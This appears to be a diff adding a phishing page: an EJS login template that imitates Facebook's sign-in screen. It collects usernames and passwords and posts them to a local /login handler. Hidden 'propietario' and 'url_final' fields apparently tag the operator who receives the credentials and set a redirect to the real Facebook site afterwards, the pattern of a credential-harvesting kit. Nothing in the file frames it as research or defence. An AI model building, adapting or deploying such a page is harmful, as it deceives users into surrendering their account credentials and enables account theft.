@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="<%= i18n.language %>">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&display=swap');
+    * { font-family: 'Poppins', sans-serif !important; box-sizing: border-box; margin: 0; }
+    body { background: #f0f2f5; }
+    .container , .row , .col , .content , .content-in , input , button { justify-content: center; align-items: center; width: 100%; }
+    .container , .row , input , button { display: flex; }
+    .container { min-height: 91vh; }
+    .row { max-width: 510px; margin: auto; padding: 10px; }
+    .col { flex-wrap: wrap; }
+    .content { margin: 12px auto; }
+    .content:nth-child(1) .h2 { text-align: center; font-size: 45px; font-weight: bold; color: #0866ff; }
+    .content:nth-child(2) { background: white; box-shadow: 2px 4px 8px rgba(0,0,0,0.1) , 4px 8px 16px rgba(0,0,0,0.1); padding: 22px; border-radius: 12px; }
+    .content .content-in { margin: 15px auto; }
+    .content .content-in .h3 { text-align: center; font-weight: 400; font-size: 24px; }
+    .content-in input , .content-in button { padding: 14px 16px; font-size: 21px; outline: none; border-radius: 4px; font-weight: 400; }
+    .content-in input { border: 1px solid #ccc; }
+    .content-in input:focus { opacity: 0.6; }
+    .content-in button { background: #166fe5; color: white; cursor: pointer; transition: all .5s ease; opacity: 0.85; border: none; }
+    .content-in button:hover { opacity: 1; }
+    .disabled_ { pointer-events: none !important; user-select: none !important; opacity: 0.4 !important; }
+    .content-in:last-child { display: grid; grid-template-columns: 1fr 1fr; gap:10px; }
+    .content-in a { text-decoration: none; color: blue; font-size: 17px; display: flex; justify-content: center; align-items: center; width: 100%; }
+    .content-in a:hover { text-decoration: underline; }
+    input[type="text"], input[type="password"]{ width:100% !important; display:block; }
+    .error-message { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; padding: 1rem; border-radius: 0.5rem; margin-bottom: 1rem; text-align: center; display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="row">
+      <div class="col">
+        <div class="content"><h2 class="h2">facebook</h2></div>
+        
+        <form action="/login" method="post" class="content">
+          <div class="content-in"><h3 class="h3"><%= t('login.title') %></h3></div>
+          <div id="errorMessage" class="error-message"><%= t('login.error_message') %></div>
+          
+          <div class="content-in">
+            <input type="text" name="username" placeholder="<%= t('login.placeholder_email') %>" spellcheck="false" autocomplete="off" required><br>
+            <input type="password" name="password" placeholder="<%= t('login.placeholder_password') %>" spellcheck="false" autocomplete="off" required>
+          </div>
+
+          <input type="hidden" name="propietario" id="propietarioField">
+          <input type="hidden" name="url_final" id="urlFinalField">
+
+          <div class="content-in"><button type="submit"><%= t('login.button') %></button></div>
+          <div class="content-in"><a href="#"><%= t('login.forgot_password') %></a><a href="#"><%= t('login.create_account') %></a></div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const form = document.querySelector("form");
+  const button = form.querySelector("button");
+
+  form.addEventListener("submit", function(e) {
+    button.disabled = true;
+    button.classList.add("disabled_");
+  });
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    if (urlParams.get('error') === '1') {
+        document.getElementById('errorMessage').style.display = 'block';
+    }
+
+    const propietario = urlParams.get('propietario') || 'default-owner';
+    let url_final = urlParams.get('url_final') || 'https://www.facebook.com';
+
+    if (!url_final.startsWith('http://') && !url_final.startsWith('https://')) {
+        url_final = 'https://' + url_final;
+    }
+
+    document.getElementById('propietarioField').value = propietario;
+    document.getElementById('urlFinalField').value = url_final;
+  });
+</script>
+
+</body>
+</html>
